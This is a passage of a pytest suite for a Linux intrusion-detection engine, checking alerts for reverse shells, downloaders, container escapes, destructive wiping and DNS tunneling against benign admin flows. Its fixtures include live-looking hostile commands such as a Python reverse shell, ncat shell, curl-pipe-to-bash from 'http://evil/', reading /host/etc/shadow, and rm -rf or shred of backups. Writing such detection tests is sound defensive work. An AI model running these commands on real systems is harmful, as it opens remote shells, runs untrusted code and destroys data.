            pytest.param("debian", "ssh_login", "unattended-upgrades && ssh-keygen -A", "unattended-upgrades", "scp /tmp/pkg.deb repo@10.0.5.20:/srv/repo/pkg.deb", "scp", id="debian-repo-mirror-benign"),
            pytest.param("rhel", "identity_login", "subscription-manager refresh && ssh-keygen -A", "subscription-manager", "rsync /var/tmp/agent.rpm repo@10.0.6.10:/srv/repo/agent.rpm", "rsync", id="rhel-repo-mirror-benign"),
            pytest.param("suse", "vpn_login", "transactional-update run ssh-keygen -A", "transactional-update", "scp /tmp/repomd.xml mirror@192.168.10.44:/srv/www/repo/repodata/repomd.xml", "scp", id="suse-repo-mirror-benign"),
        ],
    )
    def test_benign_lateral_movement_admin_flows_are_excluded_per_distro(self, engine, distro_family, login_action, prep_cmd, prep_process, remote_cmd, remote_process):
        login_evt = _auth_evt(time.time(), action=login_action, outcome="success", user="root", host=f"{distro_family}-lm-benign", distro_family=distro_family)
        prep_evt = _proc_evt(login_evt.ts + 10, prep_cmd, host=f"{distro_family}-lm-benign", user="root", process=prep_process, distro_family=distro_family)
        remote_evt = _proc_evt(login_evt.ts + 20, remote_cmd, host=f"{distro_family}-lm-benign", user="root", process=remote_process, distro_family=distro_family)

        engine.analyze(login_evt)
        prep_hits = {r.rule_id for r in engine.analyze(prep_evt)}
        remote_hits = {r.rule_id for r in engine.analyze(remote_evt)}
        hits = prep_hits | remote_hits

        assert "ATK-LM-003" not in hits
        assert "ATK-LM-004" not in hits
        assert "SEQ-060" not in hits

    @pytest.mark.parametrize(
        ("distro_family", "login_action", "prep_cmd", "remote_cmd"),
        [
            pytest.param("debian", "ssh_login", "ssh-keygen -R 10.0.5.20", "scp /etc/ansible/hosts ops@10.0.5.20:/etc/ansible/hosts", id="debian-known-hosts-ansible-sync"),
            pytest.param("rhel", "identity_login", "ssh-keygen -F 10.0.6.10", "rsync /etc/puppetlabs/puppet/ssl/certs/node.pem ops@10.0.6.10:/var/lib/puppet/ssl/certs/node.pem", id="rhel-known-hosts-puppet-sync"),
            pytest.param("suse", "vpn_login", "ssh-keygen -R 192.168.10.44", "scp /srv/salt/top.sls ops@192.168.10.44:/srv/salt/top.sls", id="suse-known-hosts-salt-sync"),
        ],
    )
    def test_benign_known_hosts_and_config_sync_do_not_alert_lm_chain(self, engine, distro_family, login_action, prep_cmd, remote_cmd):
        login_evt = _auth_evt(time.time(), action=login_action, outcome="success", user="root", host=f"{distro_family}-lm-benign-sync", distro_family=distro_family)
        prep_evt = _proc_evt(login_evt.ts + 10, prep_cmd, host=f"{distro_family}-lm-benign-sync", user="root", process="ssh-keygen", distro_family=distro_family)
        remote_evt = _proc_evt(login_evt.ts + 20, remote_cmd, host=f"{distro_family}-lm-benign-sync", user="root", process=remote_cmd.split()[0], distro_family=distro_family)

        engine.analyze(login_evt)
        prep_hits = {r.rule_id for r in engine.analyze(prep_evt)}
        remote_hits = {r.rule_id for r in engine.analyze(remote_evt)}
        hits = prep_hits | remote_hits

        assert "ATK-LM-003" not in hits
        assert "ATK-LM-004" not in hits
        assert "SEQ-060" not in hits


class TestTunnelAndReverseShellRules:
    def test_reverse_shell_and_tunnel_rules_are_loaded(self, engine):
        ids = {rule["id"] for rule in engine.rule_engine.rules}
        seq_ids = {seq["id"] for seq in engine.sequence.SEQUENCES}
        assert "PROC-C2-001" in ids
        assert "PROC-C2-002" in ids
        assert "SEQ-061" in seq_ids
        assert "SEQ-062" in seq_ids

    def test_login_then_reverse_shell_sequence_alerts(self, engine):
        login_evt = _auth_evt(time.time(), action="ssh_login", outcome="success", user="alice", host="tunnel-attack-01")
        shell_evt = _proc_evt(
            login_evt.ts + 10,
            "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"203.0.113.50\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
            host="tunnel-attack-01",
            process="python3",
        )

        first_hits = [r.rule_id for r in engine.analyze(login_evt)]
        second_hits = [r.rule_id for r in engine.analyze(shell_evt)]

        assert "SEQ-061" in second_hits
        assert "PROC-C2-001" in second_hits

    def test_login_then_suspicious_ssh_tunnel_sequence_alerts(self, engine):
        login_evt = _auth_evt(time.time(), action="ssh_login", outcome="success", user="alice", host="tunnel-attack-02")
        tunnel_evt = _proc_evt(
            login_evt.ts + 15,
            "ssh -Nf -D 1080 -o StrictHostKeyChecking=no ops@198.51.100.10",
            host="tunnel-attack-02",
            process="ssh",
        )

        engine.analyze(login_evt)
        hits = [r.rule_id for r in engine.analyze(tunnel_evt)]

        assert "PROC-C2-002" in hits
        assert "SEQ-061" in hits

    def test_web_abuse_then_reverse_shell_sequence_alerts(self, engine):
        web_evt = _web_evt(time.time(), "/uploads/shell.php?cmd=id", attack="shell_upload", host="web-tunnel-01")
        shell_evt = _proc_evt(
            web_evt.ts + 12,
            "ncat 203.0.113.77 4444 -c /bin/sh",
            host="web-tunnel-01",
            user="www-data",
            process="ncat",
        )

        first_hits = [r.rule_id for r in engine.analyze(web_evt)]
        second_hits = [r.rule_id for r in engine.analyze(shell_evt)]

        assert "SEQ-062" in second_hits
        assert "PROC-C2-001" in second_hits

    def test_benign_admin_port_forward_does_not_alert(self, engine):
        evt = _proc_evt(
            time.time(),
            "ssh -N -L 5432:127.0.0.1:5432 admin@bastion",
            host="tunnel-benign-01",
            user="root",
            process="ssh",
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PROC-C2-002" not in hits

    def test_benign_socat_local_forward_does_not_alert_reverse_shell_rule(self, engine):
        evt = _proc_evt(
            time.time(),
            "socat TCP-LISTEN:9443,fork TCP-CONNECT:127.0.0.1:443",
            host="tunnel-benign-01b",
            user="root",
            process="socat",
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PROC-C2-001" not in hits

    def test_benign_health_debug_flow_does_not_alert_seq_062(self, engine):
        exec_evt = _proc_evt(
            time.time(),
            "kubectl exec -n kube-system metrics-server -- /bin/true",
            host="tunnel-benign-02",
            user="root",
            process="kubectl",
        )
        follow_evt = _proc_evt(
            exec_evt.ts + 10,
            "curl -fsS http://127.0.0.1/healthz",
            host="tunnel-benign-02",
            user="root",
            process="curl",
        )

        engine.analyze(exec_evt)
        hits = [r.rule_id for r in engine.analyze(follow_evt)]

        assert "SEQ-062" not in hits

    def test_benign_admin_ssh_does_not_trigger_remote_push_rule(self, engine):
        evt = _proc_evt(
            time.time(),
            "ssh admin@10.0.5.20 uptime",
            host="lm-benign-02",
            user="root",
            process="ssh",
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "ATK-LM-004" not in hits

    def test_backup_rsync_does_not_trigger_remote_push_rule(self, engine):
        evt = _proc_evt(
            time.time(),
            "rsync /var/backups/etc-nightly.tgz backup@198.51.100.60:/srv/backup/",
            host="lm-benign-03",
            user="root",
            process="rsync",
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "ATK-LM-004" not in hits

    def test_routine_config_management_does_not_trigger_ansible_remote_rule(self, engine):
        evt = _proc_evt(
            time.time(),
            "ansible-playbook maintenance.yml -i inventories/prod",
            host="lm-benign-04",
            user="root",
            process="ansible-playbook",
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "ATK-LM-003" not in hits
        assert "ATK-LM-004" not in hits


class TestDownloaderStagerRules:
    def test_downloader_rules_and_sequences_are_loaded(self, engine):
        ids = {rule["id"] for rule in engine.rule_engine.rules}
        seq_ids = {seq["id"] for seq in engine.sequence.SEQUENCES}
        assert "PROC-DL-001" in ids
        assert "PROC-DL-002" in ids
        assert "SEQ-063" in seq_ids
        assert "SEQ-064" in seq_ids

    def test_login_then_download_execute_sequence_alerts(self, engine):
        login_evt = _auth_evt(time.time(), action="ssh_login", outcome="success", user="alice", host="dl-attack-01")
        dl_evt = _proc_evt(
            login_evt.ts + 10,
            "curl -fsSL http://evil/payload.sh -o /tmp/payload.sh",
            host="dl-attack-01",
            process="curl",
        )
        exec_evt = _proc_evt(
            login_evt.ts + 20,
            "chmod +x /tmp/payload.sh && /tmp/payload.sh",
            host="dl-attack-01",
            process="chmod",
        )

        engine.analyze(login_evt)
        first_hits = [r.rule_id for r in engine.analyze(dl_evt)]
        second_hits = [r.rule_id for r in engine.analyze(exec_evt)]

        assert "PROC-DL-002" in first_hits
        assert "SEQ-063" in second_hits

    def test_inline_fetch_exec_rule_alerts(self, engine):
        evt = _proc_evt(
            time.time(),
            'bash -c "$(curl -fsSL http://evil/p.sh)"',
            host="dl-attack-02",
            process="bash",
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PROC-DL-001" in hits

    def test_python_url_fetch_exec_rule_alerts(self, engine):
        evt = _proc_evt(
            time.time(),
            'python3 -c "import urllib.request;exec(urllib.request.urlopen(\'http://evil/p.py\').read())"',
            host="dl-attack-03",
            process="python3",
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PROC-DL-001" in hits

    def test_web_abuse_then_download_execute_sequence_alerts(self, engine):
        web_evt = _web_evt(time.time(), "/uploads/shell.php?cmd=id", attack="shell_upload", host="dl-web-01")
        dl_evt = _proc_evt(
            web_evt.ts + 10,
            "wget -qO /tmp/agent.sh http://evil/agent.sh",
            host="dl-web-01",
            user="www-data",
            process="wget",
        )
        exec_evt = _proc_evt(
            web_evt.ts + 20,
            "sh /tmp/agent.sh",
            host="dl-web-01",
            user="www-data",
            process="sh",
        )

        engine.analyze(web_evt)
        engine.analyze(dl_evt)
        hits = [r.rule_id for r in engine.analyze(exec_evt)]

        assert "SEQ-064" in hits

    def test_benign_package_fetch_does_not_alert_downloader_rules(self, engine):
        evt = _proc_evt(
            time.time(),
            "curl -fsS https://repo.example.com/pkg.deb -o /tmp/pkg.deb",
            host="dl-benign-01",
            user="root",
            process="curl",
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PROC-DL-001" not in hits
        assert "PROC-DL-002" not in hits

    def test_repo_bootstrap_does_not_alert_downloader_rules(self, engine):
        evt = _proc_evt(
            time.time(),
            "git clone https://github.com/example/project.git && ./bootstrap.sh",
            host="dl-benign-02",
            user="alice",
            process="git",
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PROC-DL-001" not in hits
        assert "PROC-DL-002" not in hits

    def test_config_management_download_does_not_alert_downloader_sequence(self, engine):
        login_evt = _auth_evt(time.time(), action="ssh_login", outcome="success", user="root", host="dl-benign-03")
        dl_evt = _proc_evt(
            login_evt.ts + 10,
            "ansible-playbook site.yml --extra-vars artifact_url=https://repo.example.com/app.tgz",
            host="dl-benign-03",
            user="root",
            process="ansible-playbook",
        )
        exec_evt = _proc_evt(
            login_evt.ts + 20,
            "bash /tmp/ansible-bootstrap.sh",
            host="dl-benign-03",
            user="root",
            process="bash",
        )

        engine.analyze(login_evt)
        engine.analyze(dl_evt)
        hits = [r.rule_id for r in engine.analyze(exec_evt)]

        assert "SEQ-063" not in hits


class TestDistroParityBackfill:
    @pytest.mark.parametrize(
        ("web_evt", "follow_evt", "expected"),
        [
            pytest.param(
                _web_evt(time.time(), "/uploads/cache.php.jpg?cmd=%60id%60", attack="shell_upload", action="http_request", host="parity-web-rhel", source="apache2"),
                _proc_evt(time.time() + 10, "bash -c 'curl http://198.51.100.70/p.sh | bash'", host="parity-web-rhel", user="apache", process="bash", source="auditd", distro_family="rhel"),
                {"WEB-017", "SEQ-052"},
                id="rhel-httpd-positive",
            ),
            pytest.param(
                _web_evt(time.time(), "/app/%252e%252e/%252e%252e/etc/passwd", attack="path_traversal", action="path_traversal", host="parity-web-suse", source="apache2", status=403),
                _proc_evt(time.time() + 10, "cp shell.service /etc/systemd/system/shell.service && systemctl daemon-reload", host="parity-web-suse", user="wwwrun", process="systemctl", source="syslog", distro_family="suse"),
                {"SEQ-052", "SEQ-056"},
                id="suse-httpd-positive",
            ),
        ],
    )
    def test_web_httpd_family_variants_alert(self, engine, web_evt, follow_evt, expected):
        first_hits = {r.rule_id for r in engine.analyze(web_evt)}
        second_hits = {r.rule_id for r in engine.analyze(follow_evt)}
        hits = first_hits | second_hits
        for rule_id in expected:
            assert rule_id in hits

    @pytest.mark.parametrize(
        ("web_evt", "follow_evt", "forbidden"),
        [
            pytest.param(
                _web_evt(time.time(), "/server-status?auto", attack="shell_upload", action="http_request", host="parity-web-benign-rhel", source="apache2", ua="Prometheus/2.52"),
                _proc_evt(time.time() + 10, "bin/console cache:warmup", host="parity-web-benign-rhel", user="apache", process="php", source="auditd", distro_family="rhel"),
                {"WEB-017", "SEQ-052", "SEQ-056"},
                id="rhel-httpd-benign",
            ),
            pytest.param(
                _web_evt(time.time(), "/server-info", attack="shell_upload", action="http_request", host="parity-web-benign-suse", source="apache2", ua="kube-probe/1.31"),
                _proc_evt(time.time() + 10, "curl -fsS http://127.0.0.1/healthz", host="parity-web-benign-suse", user="wwwrun", process="curl", source="syslog", distro_family="suse"),
                {"WEB-017", "SEQ-052", "SEQ-056"},
                id="suse-httpd-benign",
            ),
        ],
    )
    def test_web_httpd_family_benign_flows_are_rejected(self, engine, web_evt, follow_evt, forbidden):
        engine.analyze(web_evt)
        hits = {r.rule_id for r in engine.analyze(follow_evt)}
        for rule_id in forbidden:
            assert rule_id not in hits

    @pytest.mark.parametrize(
        ("first_evt", "follow_evt", "expected"),
        [
            pytest.param(
                _proc_evt(time.time(), "podman exec -it webapp sh", host="parity-cont-rhel", user="root", process="podman", source="auditd", distro_family="rhel"),
                _proc_evt(time.time() + 10, "cat /host/etc/shadow", host="parity-cont-rhel", user="root", process="cat", source="auditd", distro_family="rhel"),
                {"PROC-CONT-001", "SEQ-059"},
                id="rhel-podman-positive",
            ),
            pytest.param(
                _proc_evt(time.time(), "podman run --privileged -v /:/host registry.suse.com/bci/bci-base sh", host="parity-cont-suse", user="root", process="podman", source="syslog", distro_family="suse"),
                _proc_evt(time.time() + 10, "curl http://198.51.100.71/p.sh | bash", host="parity-cont-suse", user="root", process="bash", source="syslog", distro_family="suse"),
                {"PROC-CONT-001", "SEQ-053", "SEQ-059"},
                id="suse-podman-positive",
            ),
        ],
    )
    def test_podman_family_variants_alert(self, engine, first_evt, follow_evt, expected):
        first_hits = {r.rule_id for r in engine.analyze(first_evt)}
        second_hits = {r.rule_id for r in engine.analyze(follow_evt)}
        hits = first_hits | second_hits
        for rule_id in expected:
            assert rule_id in hits

    @pytest.mark.parametrize(
        ("evt", "forbidden"),
        [
            pytest.param(
                _proc_evt(time.time(), "podman pull registry.access.redhat.com/ubi9/ubi:latest", host="parity-cont-benign-rhel", user="root", process="podman", source="auditd", distro_family="rhel"),
                {"PROC-CONT-001", "SEQ-053", "SEQ-059"},
                id="rhel-podman-benign",
            ),
            pytest.param(
                _proc_evt(time.time(), "curl -fsS https://mirror.example.com/baseos/pkg.rpm -o /tmp/pkg.rpm", host="parity-dl-benign-rhel", user="root", process="curl", source="auditd", distro_family="rhel"),
                {"PROC-DL-001", "PROC-DL-002"},
                id="rhel-rpm-benign",
            ),
            pytest.param(
                _proc_evt(time.time(), "wget -qO /tmp/repomd.xml https://updates.example.com/repo/oss/repodata/repomd.xml", host="parity-dl-benign-suse", user="root", process="wget", source="syslog", distro_family="suse"),
                {"PROC-DL-001", "PROC-DL-002"},
                id="suse-repodata-benign",
            ),
        ],
    )
    def test_family_benign_backfill_does_not_alert(self, engine, evt, forbidden):
        hits = {r.rule_id for r in engine.analyze(evt)}
        for rule_id in forbidden:
            assert rule_id not in hits


class TestImpactDestructiveRules:
    def test_destructive_rules_and_sequences_are_loaded(self, engine):
        ids = {rule["id"] for rule in engine.rule_engine.rules}
        seq_ids = {seq["id"] for seq in engine.sequence.SEQUENCES}
        assert "PROC-IMP-001" in ids
        assert "PROC-IMP-002" in ids
        assert "SEQ-065" in seq_ids
        assert "SEQ-066" in seq_ids

    def test_login_then_destructive_delete_sequence_alerts(self, engine):
        login_evt = _auth_evt(time.time(), action="ssh_login", outcome="success", user="alice", host="impact-attack-01")
        wipe_evt = _proc_evt(
            login_evt.ts + 15,
            "rm -rf /srv/www/releases /var/www/html /home/alice",
            host="impact-attack-01",
            user="alice",
            process="rm",
        )

        engine.analyze(login_evt)
        hits = [r.rule_id for r in engine.analyze(wipe_evt)]

        assert "PROC-IMP-001" in hits
        assert "SEQ-065" in hits

    def test_backup_artifact_tamper_rule_alerts(self, engine):
        evt = _proc_evt(
            time.time(),
            "chattr +i /var/backups/nightly.tgz && shred /var/backups/catalog.db",
            host="impact-attack-02",
            user="root",
            process="chattr",
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PROC-IMP-002" in hits

    def test_downloader_then_destructive_sequence_alerts(self, engine):
        dl_evt = _proc_evt(
            time.time(),
            "curl -fsSL http://evil/payload.sh -o /tmp/payload.sh",
            host="impact-attack-03",
            user="root",
            process="curl",
        )
        wipe_evt = _proc_evt(
            dl_evt.ts + 20,
            "find /var/backups /srv/backup -type f -delete",
            host="impact-attack-03",
            user="root",
            process="find",
        )

        engine.analyze(dl_evt)
        hits = [r.rule_id for r in engine.analyze(wipe_evt)]

        assert "SEQ-066" in hits

    def test_web_abuse_then_destructive_sequence_alerts(self, engine):
        web_evt = _web_evt(time.time(), "/uploads/shell.php?cmd=id", attack="shell_upload", host="impact-web-01")
        wipe_evt = _proc_evt(
            web_evt.ts + 10,
            "dd if=/dev/zero of=/srv/app/config.db bs=1M count=32",
            host="impact-web-01",
            user="www-data",
            process="dd",
        )

        engine.analyze(web_evt)
        hits = [r.rule_id for r in engine.analyze(wipe_evt)]

        assert "PROC-IMP-001" in hits
        assert "SEQ-066" in hits

    def test_benign_tmp_cleanup_does_not_alert_impact_rules(self, engine):
        evt = _proc_evt(
            time.time(),
            "find /tmp -type f -mtime +7 -delete",
            host="impact-benign-01",
            user="root",
            process="find",
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PROC-IMP-001" not in hits
        assert "PROC-IMP-002" not in hits

    def test_benign_package_cleanup_does_not_alert_impact_rules(self, engine):
        evt = _proc_evt(
            time.time(),
            "apt-get autoremove -y && apt-get clean",
            host="impact-benign-02",
            user="root",
            process="apt-get",
        )

        hits = [r.rule_id for r in engine.analyze(evt)]

        assert "PROC-IMP-001" not in hits
        assert "PROC-IMP-002" not in hits

    def test_controlled_admin_maintenance_does_not_alert_destructive_sequence(self, engine):
        login_evt = _auth_evt(time.time(), action="ssh_login", outcome="success", user="root", host="impact-benign-03")
        maintenance_evt = _proc_evt(
            login_evt.ts + 20,
            "ansible-playbook maintenance.yml --tags cleanup",
            host="impact-benign-03",
            user="root",
            process="ansible-playbook",
        )

        engine.analyze(login_evt)
        hits = [r.rule_id for r in engine.analyze(maintenance_evt)]

        assert "SEQ-065" not in hits
        assert "SEQ-066" not in hits


class TestSequenceRiskTuning:
    def test_high_fidelity_sequences_keep_high_risk_scores(self, engine):
        scores = {seq["id"]: seq["score"] for seq in engine.sequence.SEQUENCES}

        assert scores["SEQ-061"] >= 94
        assert scores["SEQ-062"] >= 95
        assert scores["SEQ-063"] >= 92
        assert scores["SEQ-064"] >= 94
        assert scores["SEQ-065"] >= 95
        assert scores["SEQ-066"] >= 96

    def test_admin_adjacent_sequences_are_tuned_down(self, engine):
        scores = {seq["id"]: seq["score"] for seq in engine.sequence.SEQUENCES}

        assert scores["SEQ-047"] <= 80
        assert scores["SEQ-048"] <= 78
        assert scores["SEQ-050"] <= 78
        assert scores["SEQ-051"] <= 76
        assert scores["SEQ-055"] <= 85
        assert scores["SEQ-058"] <= 84


class TestDarImpactDistroParity:
    @pytest.mark.parametrize(
        ("distro_family", "login_action", "precursor_cmd", "precursor_process", "destructive_cmd", "destructive_process", "expected"),
        [
            pytest.param("debian", "ssh_login", None, None, "rm -rf /srv/app/releases /var/www/html", "rm", {"PROC-IMP-001", "SEQ-065"}, id="debian-login-destroy"),
            pytest.param("rhel", "identity_login", "curl -fsSL http://evil/payload.sh -o /tmp/payload.sh", "curl", "find /var/backups /srv/backup -type f -delete", "find", {"PROC-IMP-001", "SEQ-066"}, id="rhel-downloader-destroy"),
            pytest.param("suse", "vpn_login", None, None, "btrfs subvolume delete /.snapshots/42/snapshot", "btrfs", {"PROC-IMP-001", "SEQ-065"}, id="suse-snapshots-destroy"),
        ],
    )
    def test_positive_impact_parity_per_distro(self, engine, distro_family, login_action, precursor_cmd, precursor_process, destructive_cmd, destructive_process, expected):
        login_evt = _auth_evt(time.time(), action=login_action, outcome="success", user="root", host=f"{distro_family}-impact-pos", distro_family=distro_family)
        engine.analyze(login_evt)
        hits = set()
        if precursor_cmd:
            precursor_evt = _proc_evt(login_evt.ts + 10, precursor_cmd, host=f"{distro_family}-impact-pos", user="root", process=precursor_process, distro_family=distro_family)
            hits |= {r.rule_id for r in engine.analyze(precursor_evt)}
        destructive_evt = _proc_evt(login_evt.ts + 20, destructive_cmd, host=f"{distro_family}-impact-pos", user="root", process=destructive_process, distro_family=distro_family)
        hits |= {r.rule_id for r in engine.analyze(destructive_evt)}

        for rule_id in expected:
            assert rule_id in hits

    @pytest.mark.parametrize(
        ("distro_family", "login_action", "cmdline", "process"),
        [
            pytest.param("debian", "ssh_login", "apt-get autoremove -y && apt-get clean", "apt-get", id="debian-maintenance-benign"),
            pytest.param("rhel", "identity_login", "dnf clean all && journalctl --vacuum-time=7d", "dnf", id="rhel-maintenance-benign"),
            pytest.param("suse", "vpn_login", "snapper cleanup number && transactional-update cleanup", "snapper", id="suse-maintenance-benign"),
        ],
    )
    def test_benign_impact_admin_flows_are_excluded_per_distro(self, engine, distro_family, login_action, cmdline, process):
        login_evt = _auth_evt(time.time(), action=login_action, outcome="success", user="root", host=f"{distro_family}-impact-benign", distro_family=distro_family)
        benign_evt = _proc_evt(login_evt.ts + 20, cmdline, host=f"{distro_family}-impact-benign", user="root", process=process, distro_family=distro_family)

        engine.analyze(login_evt)
        hits = {r.rule_id for r in engine.analyze(benign_evt)}

        assert "PROC-IMP-001" not in hits
        assert "PROC-IMP-002" not in hits
        assert "SEQ-065" not in hits
        assert "SEQ-066" not in hits


class TestRiskSignalWeights:
    """Risk-weight mapping should behave correctly."""

    def test_isolation_forest_weight(self):
        """The isolation_forest signal should take 0.90, not the 0.50 fallback."""
        import sys
        sys.path.insert(0, '.')
        from core.risk import DEFAULT_WEIGHTS
        assert "isolation_forest" in DEFAULT_WEIGHTS, "isolation_forest DEFAULT_WEIGHTS'te yok"
        assert DEFAULT_WEIGHTS["isolation_forest"] == 0.9

    def test_user_baseline_weight(self):
        from core.risk import DEFAULT_WEIGHTS
        assert "user_baseline" in DEFAULT_WEIGHTS
        assert DEFAULT_WEIGHTS["user_baseline"] == 0.8

    def test_no_hmm_weight(self):
        """The ghost HMM reference should be removed."""
        from core.risk import DEFAULT_WEIGHTS
        assert "hmm" not in DEFAULT_WEIGHTS, "hmm ghost referansı hâlâ var"


class TestDNSBehavioralRules:
    def test_suspicious_long_dns_query_triggers_dns_005(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            source="named",
            category="network",
            action="dns_query",
            outcome="unknown",
            src_ip="192.0.2.63",
            message="DNS query",
            fields={
                "domain": "aaaaaaaaaaaaaaaaaaaaaaaa.payloadsegment123456789.controlsegment987654321.example.net",
                "qtype": "A",
                "entropy": 3.2,
            },
        )

        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "DNS-005" in hits

    def test_high_entropy_dns_query_triggers_dns_006(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            source="named",
            category="network",
            action="dns_query",
            outcome="unknown",
            src_ip="192.0.2.64",
            message="DNS query",
            fields={
                "domain": "a9f3k2m8q1w7z5x4c6v0b2n8.example.net",
                "qtype": "A",
                "entropy": 4.12,
            },
        )

        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "DNS-006" in hits

    def test_suspicious_txt_lookup_triggers_dns_007(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            source="named",
            category="network",
            action="dns_query",
            outcome="unknown",
            src_ip="192.0.2.65",
            message="DNS query",
            fields={
                "domain": "m9q8w7e6r5t4y3u2i1o0p9a8.payloadchunk987654321.control.example.com",
                "qtype": "TXT",
                "entropy": 3.92,
            },
        )

        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "DNS-007" in hits

    def test_dns_tunneling_pattern_triggers_dns_008(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            source="named",
            category="network",
            action="dns_query",
            outcome="unknown",
            src_ip="192.0.2.66",
            message="DNS query",
            fields={
                "domain": "chunk000000000000001.segment000000000000002.block000000000000003.ctrl000000000000004.stage.example.com",
                "qtype": "TXT",
                "entropy": 3.75,
            },
        )

        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "DNS-008" in hits

    def test_dns_resolver_config_tamper_triggers_dns_009(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            source="auditd",
            category="filesystem",
            action="sensitive_file_access",
            outcome="success",
            process="bash",
            message="Kritik dosya yazma: /etc/resolv.conf",
            fields={
                "file_path": "/etc/resolv.conf",
                "write_access": True,
                "sensitive": True,
                "comm": "bash",
            },
        )

        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "DNS-009" in hits

    def test_long_txt_subdomain_query_triggers_dns_003(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            source="named",
            category="network",
            action="dns_query",
            outcome="unknown",
            src_ip="192.0.2.60",
            message="DNS query",
            fields={
                "domain": "abcdefghijklmnopqrstuvwx.payload.chunk01.example.com",
                "qtype": "TXT",
            },
        )

        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "DNS-003" in hits

    def test_dga_nxdomain_query_triggers_dns_004(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            source="named",
            category="network",
            action="dga_detected",
            outcome="failure",
            src_ip="192.0.2.61",
            message="DGA suspicion",
            fields={
                "domain": "a9z8y7x6w5v4u3t2.example.xyz",
                "qtype": "A",
                "entropy": 3.9,
                "dga": True,
            },
        )

        hits = [r.rule_id for r in engine.analyze(evt)]
        assert "DNS-004" in hits

    def test_normal_single_domain_does_not_trigger_new_dns_expansion_rules(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            source="named",
            category="network",
            action="dns_query",
            outcome="unknown",
            src_ip="192.0.2.67",
            message="DNS query",
            fields={"domain": "packages.ubuntu.com", "qtype": "A", "entropy": 2.3},
        )

        hits = {r.rule_id for r in engine.analyze(evt)}
        assert not ({"DNS-005", "DNS-006", "DNS-007", "DNS-008"} & hits)

    def test_spf_dkim_dmarc_txt_noise_does_not_trigger_dns_007(self, engine):
        for domain in (
            "selector1._domainkey.example.com",
            "_dmarc.example.com",
            "_acme-challenge.example.com",
        ):
            evt = NormalizedEvent(
                ts=time.time(),
                source="named",
                category="network",
                action="dns_query",
                outcome="unknown",
                src_ip="192.0.2.68",
                message="DNS query",
                fields={"domain": domain, "qtype": "TXT", "entropy": 3.9},
            )

            hits = {r.rule_id for r in engine.analyze(evt)}
            assert "DNS-007" not in hits

    def test_read_only_resolver_inspection_does_not_trigger_dns_009(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            source="auditd",
            category="filesystem",
            action="file_access",
            outcome="success",
            process="cat",
            message="Audit PATH: /etc/resolv.conf",
            fields={"file_path": "/etc/resolv.conf", "write_access": False, "comm": "cat"},
        )

        hits = {r.rule_id for r in engine.analyze(evt)}
        assert "DNS-009" not in hits

    def test_repeated_long_dns_queries_trigger_threshold_signal(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            source="named",
            category="network",
            action="dns_query",
            outcome="unknown",
            src_ip="192.0.2.62",
            message="DNS query",
            fields={
                "domain": "aaaaaaaaaaaaaaaaaaaa01.payload.chunk01.control.example.com",
                "qtype": "TXT",
            },
        )

        hits = []
        for _ in range(5):
            evt.ts = time.time()
            hits = [r.rule_id for r in engine.analyze(evt)]

        assert "THR-020" in hits

    def test_repeated_high_entropy_dns_queries_trigger_thr_023(self, engine):
        evt = NormalizedEvent(
            ts=time.time(),
            source="named",
            category="network",
            action="dns_query",
            outcome="unknown",
            src_ip="192.0.2.69",
            message="DNS query",
            fields={
                "domain": "a9f3k2m8q1w7z5x4c6v0b2n8.example.net",
                "qtype": "A",
                "entropy": 4.12,
            },
        )

        hits = []
        for _ in range(6):
            evt.ts = time.time()
            hits = [r.rule_id for r in engine.analyze(evt)]

        assert "THR-023" in hits
